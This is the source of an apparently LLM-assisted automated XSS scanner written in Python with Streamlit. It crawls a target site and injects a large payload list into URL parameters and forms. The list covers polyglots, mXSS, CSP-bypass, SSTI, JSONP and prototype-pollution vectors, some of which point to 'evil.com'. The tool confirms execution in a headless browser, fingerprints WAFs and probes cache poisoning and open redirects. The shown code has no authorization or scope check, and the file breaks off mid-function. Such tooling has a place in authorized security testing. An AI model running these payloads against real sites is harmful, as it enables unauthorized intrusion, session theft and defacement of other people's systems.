import streamlit as st
import os
import subprocess
import requests
import re
import urllib.parse
import json
import html as html_lib
from openai import OpenAI
from bs4 import BeautifulSoup
from collections import deque
from datetime import datetime

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    PLAYWRIGHT_OK = True
except ImportError:
    PLAYWRIGHT_OK = False

st.set_page_config(
    page_title="XSS Autonomous Agent",
    page_icon="🕷️",
    layout="wide",
    initial_sidebar_state="collapsed",
)

# ── Constants ──────────────────────────────────────────────────────────────────
MODEL_FAST = "deepseek/deepseek-chat-v3-0324"
BASE_URL   = "https://openrouter.ai/api/v1"
MAX_TOKENS = 2000
MAX_PAGES  = 50
REQUEST_TIMEOUT = 14
REQ_HEADERS = {
    "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection":      "keep-alive",
}

# ── Payload arsenal ────────────────────────────────────────────────────────────
BASE_PAYLOADS = [
    # Classic
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    # Attribute breakout
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '" onmouseover="alert(1)',
    # HTML5
    '<details open ontoggle=alert(1)>',
    '<video src=1 onerror=alert(1)>',
    '<audio src=1 onerror=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    # JS context
    '";alert(1)//', "';alert(1)//", '`-alert(1)-`',
    '</script><script>alert(1)</script>',
    # Polyglots
    'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>',
    '-->"><svg/onload=alert(1)><!--',
    # mXSS
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<!--<img src="--><img src=x onerror=alert(1)>',
    # Encoding
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<IMG SRC=x onERRor=alert(1)>',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    # CSP bypass
    '<base href=//evil.com/>',
    '<object data=javascript:alert(1)>',
    # Prototype pollution
    '__proto__[xss]=1', 'constructor[prototype][xss]=1',
    # SSTI
    '{{7*7}}', '${7*7}', '<%= 7*7 %>',
    # HTML only
    '<h1>INJECTED</h1>', '<iframe src=https://evil.com>',
    # URL/href
    'javascript:alert(1)', 'data:text/html,<script>alert(1)</script>',
    # DOM hash
    '#"><img src=x onerror=alert(1)>',
    # JSON injection
    '"},"xss":"<script>alert(1)</script>',
    # JSONP
    'alert(1)//', 'alert(document.domain)//',
]

DOM_SINKS = [
    r"innerHTML\s*[+=]", r"outerHTML\s*[+=]",
    r"document\.write\s*\(", r"document\.writeln\s*\(",
    r"\.insertAdjacentHTML\s*\(",
    r"eval\s*\(", r"setTimeout\s*\(\s*['\"`]",
    r"setInterval\s*\(\s*['\"`]", r"new\s+Function\s*\(",
    r"location\.href\s*=", r"location\.assign\s*\(",
    r"location\.replace\s*\(", r"dangerouslySetInnerHTML",
    r"v-html\s*=", r"\.html\s*\(", r"\.append\s*\(",
    r"document\.URL", r"document\.location",
    r"location\.hash", r"location\.search",
    r"document\.referrer", r"window\.name",
    r"__proto__", r"prototype\[", r"\.srcdoc\s*=",
    r"postMessage\s*\(", r"addEventListener\s*\(\s*['\"]message",
]

TEMPLATE_ENGINES = {
    "jinja2":    [r"render_template", r"Jinja2", r"flask\.templating"],
    "django":    [r"django\.template", r"{% block", r"{% csrf_token"],
    "twig":      [r"Twig\\\\", r"twig_function"],
    "smarty":    [r"Smarty", r"\{assign"],
    "erb":       [r"<%=", r"ActionView"],
    "handlebars":[r"Handlebars", r"{{#if", r"{{#each"],
    "nunjucks":  [r"nunjucks", r"{% for"],
    "freemarker":[r"freemarker", r"<#if"],
    "thymeleaf": [r"th:text", r"th:utext"],
    "pug":       [r"pug\.compile", r"\.pug$"],
    "velocity":  [r"#set\s*\(", r"#foreach"],
}

WAF_SIGNATURES = {
    "Cloudflare": ["cloudflare", "cf-ray", "__cfduid", "cf_clearance"],
    "AWS WAF":    ["awswaf", "x-amzn-requestid", "x-amzn-trace-id"],
    "ModSecurity":["mod_security", "modsecurity", "NOYB"],
    "Akamai":     ["akamai", "ak_bmsc", "bm_sz"],
    "Sucuri":     ["sucuri", "x-sucuri-id"],
    "Imperva":    ["imperva", "incapsula", "visid_incap"],
    "Wordfence":  ["wordfence", "wfvt_"],
    "F5 BIG-IP":  ["bigipserver", "ts=", "F5_"],
    "Barracuda":  ["barracuda_", "barra_counter_session"],
    "Fortinet":   ["fortigate", "fortiwaf", "FORTIWAFSID"],
    "PerimeterX": ["_pxde", "_pxvid", "pxcts"],
}

# ── Session state ──────────────────────────────────────────────────────────────
defaults = {
    "log": [], "findings": [], "running": False, "done": False,
    "pages_crawled": 0, "points_found": 0, "vulns_found": 0,
    "exploit_code": "", "report": "", "dom_sinks": [],
    "waf_detected": "", "_last_target": "", "_last_payload": "",
    "_last_depth": 2, "_last_blind_url": "",
}
for k, v in defaults.items():
    if k not in st.session_state:
        st.session_state[k] = v


def get_client():
    key = os.environ.get("OPENROUTER_API_KEY", "")
    if not key:
        st.error("OPENROUTER_API_KEY not set in Replit Secrets.")
        st.stop()
    return OpenAI(api_key=key, base_url=BASE_URL)


# ── Terminal ──────────────────────────────────────────────────────────────────
ICONS = {
    "info": "▸", "ok": "✅", "warn": "⚠️", "vuln": "🚨",
    "ai": "🤖", "cmd": "⚙️", "dom": "🔬", "blind": "👁️",
    "hunt": "🔭", "skip": "⏭️",
}

_TERM_HEIGHT = 540   # px — iframe height

def _build_terminal_html() -> str:
    raw_lines = st.session_state.log if st.session_state.log else ["Ready."]
    count   = len(raw_lines)
    body_h  = _TERM_HEIGHT - 40

    # Render lines newest-first inside a column-reverse flex container.
    # column-reverse means: first DOM child = visually at BOTTOM.
    # scrollTop=0 (default) shows the bottom → newest lines always visible.
    # User scrolls UP (scrollTop increases) to see older lines.
    rows = "".join(
        '<div class="ln">'
        + l.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
        + '</div>'
        for l in reversed(raw_lines)
    )

    return f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
html,body{{height:{_TERM_HEIGHT}px;overflow:hidden;background:#0d1117;
  font-family:'Courier New',monospace;font-size:12.5px;color:#39ff14;}}
#tb{{
  display:flex;justify-content:space-between;align-items:center;
  background:#161b22;border-bottom:1px solid #238636;
  padding:4px 12px;height:40px;flex-shrink:0;
}}
#tb span{{color:#58a6ff;font-size:11px;}}
#tb button{{
  background:none;border:1px solid #238636;color:#39ff14;
  border-radius:4px;padding:2px 9px;cursor:pointer;
  font-size:11px;margin-left:5px;font-family:'Courier New',monospace;
}}
#tb button:hover{{background:#238636;color:#fff;}}
#term{{
  height:{body_h}px;overflow-y:auto;
  display:flex;flex-direction:column-reverse;
  scroll-behavior:smooth;
}}
.ln{{padding:0 16px;line-height:1.65;white-space:pre-wrap;word-break:break-all;}}
</style></head><body>
<div id="tb">
  <span>💻 Agent Terminal &nbsp;·&nbsp; {count} lines</span>
  <span>
    <button onclick="document.getElementById('term').scrollTop=document.getElementById('term').scrollHeight">⬆ Old</button>
    <button onclick="document.getElementById('term').scrollTop=0">⬇ New</button>
    <button id="fsbtn" onclick="toggleFS()">⛶ Fullscreen</button>
  </span>
</div>
<div id="term">{rows}</div>
<script>
/* column-reverse means scrollTop=0 IS the bottom (newest) — no JS needed for auto-scroll.
   But we do reset it on each load just in case the browser starts elsewhere. */
document.getElementById('term').scrollTop = 0;

function toggleFS(){{
  var fr = window.frameElement;
  var t  = document.getElementById('term');
  var btn= document.getElementById('fsbtn');
  if (!fr) {{
    var el = document.documentElement;
    var fn = el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen;
    if (fn) fn.call(el);
    return;
  }}
  if (fr._xssFS) {{
    ['position','top','left','width','height','z-index','border','background','max-width','max-height']
      .forEach(function(p){{ fr.style.removeProperty(p); }});
    fr._xssFS = false;
    t.style.height = '{body_h}px';
    btn.textContent = '⛶ Fullscreen';
  }} else {{
    [['position','fixed'],['top','0'],['left','0'],['width','100vw'],['height','100vh'],
     ['z-index','2147483647'],['border','none'],['background','#0d1117'],
     ['max-width','none'],['max-height','none']]
      .forEach(function(kv){{ fr.style.setProperty(kv[0], kv[1], 'important'); }});
    fr._xssFS = true;
    t.style.height = 'calc(100vh - 40px)';
    btn.textContent = '✕ Exit';
    t.scrollTop = 0;
    try{{ window.parent.scrollTo(0,0); }}catch(e){{}}
  }}
}}
</script>
</body></html>"""


def _draw_terminal(ph):
    ph.html(_build_terminal_html())


def log(msg: str, kind: str = "info", term_ph=None, stats_phs=None):
    ts = datetime.now().strftime("%H:%M:%S")
    prefix = ICONS.get(kind, "▸")
    st.session_state.log.append(f"[{ts}] {prefix} {msg}")
    if term_ph is not None:
        _draw_terminal(term_ph)
    if stats_phs is not None:
        _render_stats(*stats_phs)


def _render_stats(s1, s2, s3, s4, s5):
    s1.metric("Pages",        st.session_state.pages_crawled)
    s2.metric("Injection pts",st.session_state.points_found)
    s3.metric("DOM sinks",    len(st.session_state.dom_sinks))
    s4.metric("Vulns",        st.session_state.vulns_found,
              delta="🚨" if st.session_state.vulns_found > 0 else None)
    s5.metric("WAF", f"⚠️ {st.session_state.waf_detected}"
              if st.session_state.waf_detected else "✅ None")


# ── Network helpers ────────────────────────────────────────────────────────────
def safe_req(method: str, url: str, **kwargs):
    try:
        fn = requests.get if method == "get" else requests.post
        return fn(url, headers=REQ_HEADERS, timeout=REQUEST_TIMEOUT,
                  allow_redirects=True, **kwargs)
    except Exception:
        return None


def same_origin(base: str, url: str) -> bool:
    try:
        return urllib.parse.urlparse(base).netloc == \
               urllib.parse.urlparse(url).netloc
    except Exception:
        return False


def to_abs(base: str, href: str):
    try:
        url = urllib.parse.urljoin(base, href)
        p = urllib.parse.urlparse(url)
        if p.scheme in ("http", "https") and p.netloc:
            return url
    except Exception:
        pass
    return None


# ── WAF detection ──────────────────────────────────────────────────────────────
def detect_waf(resp) -> str:
    if not resp:
        return ""
    combined = (resp.text[:2000] + str(resp.headers) + str(resp.cookies)).lower()
    for waf, sigs in WAF_SIGNATURES.items():
        if any(s.lower() in combined for s in sigs):
            return waf
    if resp.status_code in (403, 406, 429, 503) and len(resp.text) < 500:
        return "Unknown WAF"
    return ""


# ── JS analysis helpers ────────────────────────────────────────────────────────
def _extract_js_endpoints(html: str, base_url: str) -> list:
    endpoints = []
    patterns = [
        r'fetch\([\'"]([^\'"?#]+)[\'"]',
        r'axios\.\w+\([\'"]([^\'"?#]+)[\'"]',
        r'\.open\([\'"](?:GET|POST)[\'"],\s*[\'"]([^\'"]+)[\'"]',
        r'url\s*[:=]\s*[\'"]([/][^\'"]+)[\'"]',
        r'[\'"](/api/[^\'"]+)[\'"]',
        r'[\'"](/v\d+/[^\'"]+)[\'"]',
        r'[\'"](/graphql[^\'"]*)[\'"]',
        r'[\'"](/rest/[^\'"]+)[\'"]',
    ]
    for pat in patterns:
        for m in re.findall(pat, html):
            abs_url = to_abs(base_url, m)
            if abs_url and abs_url not in endpoints:
                endpoints.append(abs_url)
    return endpoints[:25]


def _find_dom_sinks(html: str) -> list:
    found = []
    for pat in DOM_SINKS:
        for m in re.findall(f".{{0,70}}{pat}.{{0,90}}", html)[:3]:
            found.append(m.strip())
    return list(dict.fromkeys(found))[:25]


def _find_postmessage_handlers(html: str) -> list:
    """Find addEventListener('message', ...) calls — check for missing origin."""
    handlers = []
    pattern = r"addEventListener\s*\(\s*['\"]message['\"].*?(?:function|\()\s*\(.*?\)\s*\{(.{0,300})"
    for m in re.findall(pattern, html, re.DOTALL)[:5]:
        has_origin_check = bool(re.search(r"event\.origin|message\.origin|\.origin\s*[!=]=", m))
        handlers.append({
            "snippet": m[:200],
            "no_origin_check": not has_origin_check,
        })
    return handlers


def _find_jsonp_endpoints(html: str, base_url: str) -> list:
    """Find ?callback= or ?jsonp= style endpoints."""
    endpoints = []
    patterns = [
        r'[\'"]([^\'"]+\?(?:callback|jsonp|cb|call)=)[\'"]',
        r'src\s*=\s*[\'"]([^\'"]+\?(?:callback|jsonp|cb)=)[^\'"]*[\'"]',
    ]
    for pat in patterns:
        for m in re.findall(pat, html):
            abs_url = to_abs(base_url, m)
            if abs_url:
                endpoints.append(abs_url)
    return list(dict.fromkeys(endpoints))[:10]


def _find_open_redirect_params(html: str, url: str) -> list:
    """Find redirect/return/next parameters that could chain to XSS."""
    redirect_params = []
    redirect_names = {"redirect", "url", "next", "return", "return_to", "goto",
                      "dest", "destination", "redir", "redirect_url", "continue",
                      "target", "link", "location", "callback", "forward"}
    parsed = urllib.parse.urlparse(url)
    for param in urllib.parse.parse_qs(parsed.query).keys():
        if param.lower() in redirect_names:
            redirect_params.append(param)
    # Also scan HTML for form inputs with these names
    for m in re.findall(r'<input[^>]+name=["\'](\w+)["\']', html, re.IGNORECASE):
        if m.lower() in redirect_names and m not in redirect_params:
            redirect_params.append(m)
    return redirect_params


def _analyze_headers(headers: dict) -> list:
    issues = []
    hkeys = {k.lower(): v for k, v in headers.items()}
    for h, msg in [
        ("content-security-policy",  "No CSP — inline scripts unrestricted"),
        ("x-xss-protection",         "No X-XSS-Protection header"),
        ("x-content-type-options",   "No X-Content-Type-Options — MIME sniff risk"),
        ("x-frame-options",          "No X-Frame-Options — clickjacking risk"),
        ("strict-transport-security","No HSTS"),
        ("permissions-policy",       "No Permissions-Policy"),
    ]:
        if h not in hkeys:
            issues.append(msg)
    csp = hkeys.get("content-security-policy", "")
    if "unsafe-inline" in csp:
        issues.append("CSP: unsafe-inline — inline XSS allowed")
    if "unsafe-eval" in csp:
        issues.append("CSP: unsafe-eval — eval() XSS allowed")
    cookie = hkeys.get("set-cookie", "")
    if cookie and "httponly" not in cookie.lower():
        issues.append("Cookie: HttpOnly missing — JS cookie theft possible")
    if cookie and "samesite" not in cookie.lower():
        issues.append("Cookie: SameSite missing — CSRF risk")
    return issues


# ── Crawler ────────────────────────────────────────────────────────────────────
def crawl(target: str, max_depth: int, term_ph, stats_phs) -> list:
    visited, bfsq, pages = set(), deque([(target, 0)]), []
    while bfsq and len(pages) < MAX_PAGES:
        url, depth = bfsq.popleft()
        norm = url.split("#")[0].rstrip("/")
        if norm in visited:
            continue
        visited.add(norm)
        resp = safe_req("get", url)
        if not resp:
            continue
        ct = resp.headers.get("Content-Type", "")
        if "text/html" not in ct and "javascript" not in ct:
            continue
        soup = BeautifulSoup(resp.text, "lxml")
        forms       = _extract_forms(url, soup)
        params      = _extract_params(url)
        dom_hits    = _find_dom_sinks(resp.text)
        js_eps      = _extract_js_endpoints(resp.text, url)
        jsonp_eps   = _find_jsonp_endpoints(resp.text, url)
        redir_params= _find_open_redirect_params(resp.text, url)
        pm_handlers = _find_postmessage_handlers(resp.text)
        pages.append({
            "url": url, "html": resp.text[:18000],
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "forms": forms, "params": params,
            "dom_sinks": dom_hits,
            "inline_js": _inline_js(soup),
            "js_endpoints": js_eps,
            "jsonp_endpoints": jsonp_eps,
            "redirect_params": redir_params,
            "postmessage_handlers": pm_handlers,
        })
        st.session_state.pages_crawled = len(pages)
        extras = []
        if jsonp_eps:    extras.append(f"{len(jsonp_eps)} JSONP")
        if redir_params: extras.append(f"redirect params: {redir_params}")
        if pm_handlers:  extras.append(f"{len(pm_handlers)} postMessage")
        log(f"Crawled [{len(pages)}] {url} — {len(forms)} forms / "
            f"{len(params)} params / {len(dom_hits)} DOM sinks"
            + (f" / {', '.join(extras)}" if extras else ""),
            "cmd", term_ph, stats_phs)
        if depth < max_depth:
            for tag in soup.find_all("a", href=True):
                nxt = to_abs(url, tag["href"])
                if nxt and same_origin(target, nxt):
                    nn = nxt.split("#")[0].rstrip("/")
                    if nn not in visited:
                        bfsq.append((nxt, depth + 1))
            for tag in soup.find_all("script", src=True):
                nxt = to_abs(url, tag["src"])
                if nxt and same_origin(target, nxt):
                    nn = nxt.split("#")[0].rstrip("/")
                    if nn not in visited:
                        bfsq.append((nxt, depth + 1))
            for ep in js_eps[:6]:
                if same_origin(target, ep):
                    nn = ep.split("#")[0].rstrip("/")
                    if nn not in visited:
                        bfsq.append((ep, depth + 1))
    return pages


def _extract_forms(page_url: str, soup) -> list:
    forms = []
    for form in soup.find_all("form"):
        action    = form.get("action") or page_url
        method    = form.get("method", "get").lower()
        action_url= to_abs(page_url, action) or page_url
        fields = []
        for inp in form.find_all(["input", "textarea", "select"]):
            name  = inp.get("name") or inp.get("id") or ""
            itype = inp.get("type", "text")
            if name and itype not in ("submit", "button", "image", "file"):
                fields.append({"name": name, "type": itype,
                                "value": inp.get("value", "")})
        if fields:
            forms.append({"action": action_url, "method": method,
                           "fields": fields,
                           "enctype": form.get("enctype", "")})
    return forms


def _extract_params(url: str) -> list:
    return list(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys())


def _inline_js(soup) -> str:
    parts = []
    for tag in soup.find_all("script"):
        if not tag.get("src") and tag.string:
            parts.append(tag.string[:600])
    return "\n".join(parts[:10])


def _detect_template_engine(pages: list) -> tuple:
    combined = " ".join(p["html"] for p in pages[:5])
    for engine, sigs in TEMPLATE_ENGINES.items():
        for sig in sigs:
            if re.search(sig, combined, re.IGNORECASE):
                ssti = [
                    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
                    "{{config.items()}}", "{{request.environ}}",
                    "{% for i in range(7) %}{{i}}{% endfor %}",
                    "{{''.__class__.__mro__[1].__subclasses__()}}",
                    "{php}echo 'ssti_hit';{/php}", "{% debug %}",
                ]
                return engine, ssti
    return "", []


# ── Reflection analysis ────────────────────────────────────────────────────────
def _check_reflection(body: str, payload: str) -> dict:
    result = {"reflected": False, "escaped": False,
              "partial": False, "snippet": "", "context": ""}
    if payload in body:
        result["reflected"] = True
        escaped_forms = [
            html_lib.escape(payload),
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace('"', "&quot;").replace("'", "&#x27;"),
            urllib.parse.quote(payload),
            payload.replace("<", "\\u003c").replace(">", "\\u003e"),
            payload.replace("<", "\\x3c").replace(">", "\\x3e"),
        ]
        if any(ev in body for ev in escaped_forms):
            result["escaped"] = True
        idx = body.find(payload)
        result["snippet"] = body[max(0, idx - 150): idx + 300]
        result["context"] = _injection_context(result["snippet"], payload)
        return result
    # Partial reflection
    key_parts = [p for p in [
        payload[:20] if len(payload) > 20 else None,
        "alert(1)", "onerror=", "onload=", "ontoggle=",
        "javascript:", "<script", "onfocus",
    ] if p and p in payload and p in body]
    if key_parts:
        part = key_parts[0]
        idx  = body.find(part)
        result.update({"reflected": True, "partial": True, "escaped": False,
                        "snippet": body[max(0, idx - 100): idx + 200],
                        "context": "Partial reflection"})
    return result


def _injection_context(snippet: str, payload: str) -> str:
    before = snippet[:snippet.find(payload)] if payload in snippet else snippet[:80]
    if re.search(r'<script[^>]*>[^<]*$', before, re.DOTALL):
        return "JS context (inside <script>)"
    if re.search(r'on\w+\s*=\s*["\'][^"\']*$', before):
        return "Event handler attribute"
    if re.search(r'(href|src|action|data)\s*=\s*["\'][^"\']*$', before):
        return "URL attribute (href/src)"
    if re.search(r'<style[^>]*>[^<]*$', before, re.DOTALL):
        return "CSS context"
    if re.search(r'=\s*["\'][^"\']*$', before):
        return "HTML attribute value"
    if re.search(r'<[a-zA-Z][^>]*$', before):
        return "Inside HTML tag"
    return "HTML body"


# ── Browser verification ───────────────────────────────────────────────────────
def verify_in_browser(url: str, param: str, payload: str,
                      method: str = "get", extra_data: dict = None) -> dict:
    result = {"confirmed": False, "screenshot": None,
              "dialog_msg": None, "error": None}
    if not PLAYWRIGHT_OK:
        result["error"] = "Playwright not installed"
        return result

    if method == "get":
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        target_url = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
    else:
        target_url = url

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=[
                "--no-sandbox", "--disable-setuid-sandbox",
                "--disable-dev-shm-usage", "--disable-gpu",
                "--disable-web-security",
                "--allow-running-insecure-content",
            ])
            ctx  = browser.new_context(ignore_https_errors=True,
                                       java_script_enabled=True)
            page = ctx.new_page()
            page.add_init_script("""
                window._xss_confirmed  = false;
                window._xss_dialog_msg = null;
                ['alert','confirm','prompt'].forEach(function(fn){
                    var orig = window[fn];
                    window[fn] = function(m){
                        window._xss_confirmed  = true;
                        window._xss_dialog_msg = String(m);
                        try{ orig(m); }catch(e){}
                        return fn==='confirm'?true:(fn==='prompt'?'xss':undefined);
                    };
                });
            """)

            def _on_dialog(dlg):
                result["confirmed"]   = True
                result["dialog_msg"]  = dlg.message
                try: dlg.dismiss()
                except Exception: pass

            page.on("dialog", _on_dialog)

            try:
                page.goto(target_url, wait_until="networkidle", timeout=12000)
            except Exception:
                try:
                    page.goto(target_url, wait_until="domcontentloaded", timeout=8000)
                except Exception:
                    pass

            if method != "get":
                try:
                    for fname, fval in (extra_data or {}).items():
                        loc = page.locator(f"[name='{fname}']")
                        if loc.count() > 0: loc.first.fill(str(fval))
                    loc = page.locator(f"[name='{param}']")
                    if loc.count() > 0:
                        loc.first.fill(payload)
                        loc.first.press("Enter")
                    page.wait_for_timeout(3000)
                except Exception:
                    pass

            page.wait_for_timeout(2500)

            if not result["confirmed"]:
                try:
                    if page.evaluate("window._xss_confirmed === true"):
                        result["confirmed"]  = True
                        result["dialog_msg"] = page.evaluate("window._xss_dialog_msg")
                except Exception:
                    pass

            # DOM element injection proof
            if not result["confirmed"]:
                try:
                    injected = page.evaluate("""
                        (function(){
                            var tags=['script','img','svg','details','video','audio','iframe'];
                            for(var t of tags){
                                var els=document.querySelectorAll(
                                    t+'[onerror],'+t+'[onload],'+t+'[ontoggle],'+t+'[onfocus]');
                                if(els.length>0)return true;
                            }
                            return false;
                        })()
                    """)
                    if injected:
                        result["confirmed"]  = True
                        result["dialog_msg"] = "DOM element injected"
                except Exception:
                    pass

            try:
                result["screenshot"] = page.screenshot(full_page=False)
            except Exception:
                pass

            browser.close()
    except Exception as e:
        result["error"] = str(e)
    return result


# ── Injection testing ──────────────────────────────────────────────────────────
def test_one(url: str, param: str, payload: str, method: str = "get",
             extra_data: dict = None) -> dict:
    r = {"url": url, "param": param, "payload": payload,
         "method": method, "status": None,
         "reflected": False, "escaped": False, "partial": False,
         "context": "", "body_snippet": ""}
    try:
        if method == "get":
            parsed = urllib.parse.urlparse(url)
            p_dict = dict(urllib.parse.parse_qsl(parsed.query))
            p_dict[param] = payload
            test_url = parsed._replace(
                query=urllib.parse.urlencode(p_dict)).geturl()
            resp = requests.get(test_url, headers=REQ_HEADERS,
                                timeout=REQUEST_TIMEOUT, allow_redirects=True)
        else:
            data = dict(extra_data or {})
            data[param] = payload
            resp = requests.post(url, data=data, headers=REQ_HEADERS,
                                 timeout=REQUEST_TIMEOUT, allow_redirects=True)
        r["status"] = resp.status_code
        ref = _check_reflection(resp.text, payload)
        r.update({"reflected": ref["reflected"], "escaped": ref.get("escaped", False),
                  "partial": ref.get("partial", False),
                  "body_snippet": ref.get("snippet", ""),
                  "context": ref.get("context", "")})
    except Exception as e:
        r["error"] = str(e)
    return r


def _do_browser_verify(r: dict, term_ph, stats_phs, label: str, extra_data=None):
    """Run browser verification on a reflected hit; mutates r in place."""
    log(f"  ↳ reflected [{r['context']}] — launching browser verify...",
        "warn", term_ph, stats_phs)
    bv = verify_in_browser(r["url"], r["param"], r["payload"],
                           r["method"], extra_data=extra_data)
    r["browser_confirmed"] = bv["confirmed"]
    r["screenshot"]        = bv.get("screenshot")
    r["dialog_msg"]        = bv.get("dialog_msg")
    r["browser_error"]     = bv.get("error")
    if bv["confirmed"]:
        st.session_state.vulns_found += 1
        log(f"🎯 BROWSER CONFIRMED — {label}"
            + (f' dialog: "{bv["dialog_msg"]}"' if bv.get("dialog_msg") else ""),
            "vuln", term_ph, stats_phs)
    else:
        log(f"  ↳ reflected but NOT executed in browser — {label}", "warn", term_ph, stats_phs)


def test_page(page: dict, payloads: list, term_ph, stats_phs) -> list:
    hits = []
    for param in page.get("params", []):
        st.session_state.points_found += 1
        for payload in payloads[:18]:
            r = test_one(page["url"], param, payload, "get")
            if r["reflected"] and not r["escaped"]:
                _do_browser_verify(r, term_ph, stats_phs,
                                   f"{page['url']} ?{param}=[{payload[:50]}]")
                hits.append(r)
                break
            elif r["reflected"]:
                log(f"  Escaped reflection — {page['url']} ?{param}", "warn", term_ph, stats_phs)
                break

    for form in page.get("forms", []):
        field_data = {f["name"]: f.get("value", "test") for f in form.get("fields", [])}
        for field in form.get("fields", []):
            st.session_state.points_found += 1
            for payload in payloads[:18]:
                data = dict(field_data)
                data[field["name"]] = payload
                r = test_one(form["action"], field["name"], payload,
                             form["method"], extra_data=data)
                if r["reflected"] and not r["escaped"]:
                    _do_browser_verify(r, term_ph, stats_phs,
                                       f"form={form['action']} field={field['name']} [{payload[:50]}]",
                                       extra_data=data)
                    hits.append(r)
                    break
                elif r["reflected"]:
                    log(f"  Escaped reflection — form={form['action']} field={field['name']}",
                        "warn", term_ph, stats_phs)
                    break
    return hits


# ── Phase 3.5: Advanced Zero-Day Hunting ──────────────────────────────────────
def _hunt_cache_poisoning(target: str, term_ph, stats_phs) -> list:
    """Test unkeyed HTTP headers that may reflect in response."""
    hits = []
    marker = "CACHEPOISONTEST9182"
    headers_to_test = {
        "X-Forwarded-Host":   f"{marker}.evil.com",
        "X-Original-URL":     f"/{marker}",
        "X-Rewrite-URL":      f"/{marker}",
        "X-Forwarded-Server": f"{marker}.evil.com",
        "X-Host":             f"{marker}.evil.com",
        "X-HTTP-Host-Override": f"{marker}.evil.com",
    }
    for hname, hval in headers_to_test.items():
        try:
            h = dict(REQ_HEADERS)
            h[hname] = hval
            resp = requests.get(target, headers=h, timeout=REQUEST_TIMEOUT)
            if marker in resp.text:
                hits.append({
                    "url": target, "param": hname, "payload": hval,
                    "method": "header", "status": resp.status_code,
                    "reflected": True, "escaped": False, "partial": False,
                    "context": f"Cache-poisonable header ({hname})",
                    "body_snippet": resp.text[
                        max(0, resp.text.find(marker)-50):
                        resp.text.find(marker)+100
                    ],
                    "browser_confirmed": False,
                    "severity": "HIGH — cache poisoning → stored XSS possible",
                })
                log(f"CACHE POISONING via {hname} — marker reflected!",
                    "vuln", term_ph, stats_phs)
                st.session_state.vulns_found += 1
        except Exception:
            pass
    return hits


def _hunt_open_redirect(pages: list, term_ph, stats_phs) -> list:
    """Find open redirects and test javascript: URL injection."""
    hits = []
    for page in pages:
        for param in page.get("redirect_params", []):
            st.session_state.points_found += 1
            for js_payload in ["javascript:alert(1)", "javascript:alert(document.domain)",
                               "//evil.com", "https://evil.com"]:
                r = test_one(page["url"], param, js_payload, "get")
                if r.get("status") in (301, 302, 303, 307, 308):
                    resp2 = safe_req("get", page["url"] + f"?{param}=" +
                                    urllib.parse.quote(js_payload))
                    if resp2:
                        loc = resp2.headers.get("Location", "")
                        if js_payload in loc or "javascript:" in loc:
                            r["context"] = "Open redirect → javascript: URL injection"
                            r["browser_confirmed"] = False
                            r["severity"] = "HIGH — open redirect with javascript: URL"
                            hits.append(r)
                            log(f"OPEN REDIRECT via ?{param}= → {js_payload}",
                                "vuln", term_ph, stats_phs)
                            st.session_state.vulns_found += 1
                            break
    return hits


def _hunt_jsonp(pages: list, term_ph, stats_phs) -> list:
    """Inject XSS into JSONP callback parameters."""
    hits = []
    callback_payloads = [
        "alert(1)//", "alert(document.domain)//",
        "};alert(1);//", "alert`1`//",
    ]
    for page in pages:
        for ep in page.get("jsonp_endpoints", []):
            st.session_state.points_found += 1
            for cb_payload in callback_payloads:
                try:
                    # Append payload to callback param
                    sep = "&" if "?" in ep else "?"
                    test_url = ep + sep + "callback=" + urllib.parse.quote(cb_payload)
                    resp = requests.get(test_url, headers=REQ_HEADERS,
                                        timeout=REQUEST_TIMEOUT)
                    if cb_payload in resp.text or cb_payload[:10] in resp.text:
                        ct = resp.headers.get("Content-Type", "")
                        r = {
                            "url": test_url, "param": "callback",
                            "payload": cb_payload, "method": "get",
                            "status": resp.status_code,
                            "reflected": True, "escaped": False, "partial": False,
                            "context": "JSONP callback injection",
                            "body_snippet": resp.text[:300],
                            "browser_confirmed": False,
                            "severity": "HIGH — JSONP XSS" +
                                (" — Content-Type not JSON!" if "html" in ct else ""),
                        }
                        _do_browser_verify(r, term_ph, stats_phs,
                                           f"JSONP {ep} callback={cb_payload[:30]}")
                        hits.append(r)
                        log(f"JSONP injection confirmed: {ep}", "vuln", term_ph, stats_phs)
                        break
                except Exception:
                    pass
    return hits


def _hunt_prototype_pollution(target: str, pages: list,
                              term_ph, stats_phs) -> list:
    """Test prototype pollution vectors that lead to XSS."""
    hits = []
    proto_payloads = [
        "__proto__[xss]=alert(1)",
        "__proto__[innerHTML]=<img/src/onerror=alert(1)>",
        "constructor[prototype][xss]=1",
        "__proto__[src]=//evil.com/xss.js",
    ]
    for page in pages[:5]:
        parsed = urllib.parse.urlparse(page["url"])
        for pp in proto_payloads:
            key, _, val = pp.partition("=")
            try:
                sep = "&" if parsed.query else "?"
                test_url = page["url"] + sep + key + "=" + urllib.parse.quote(val)
                resp = requests.get(test_url, headers=REQ_HEADERS,
                                    timeout=REQUEST_TIMEOUT)
                if val in resp.text or "xss" in resp.text.lower():
                    hits.append({
                        "url": test_url, "param": key,
                        "payload": pp, "method": "get",
                        "status": resp.status_code,
                        "reflected": True, "escaped": False, "partial": False,
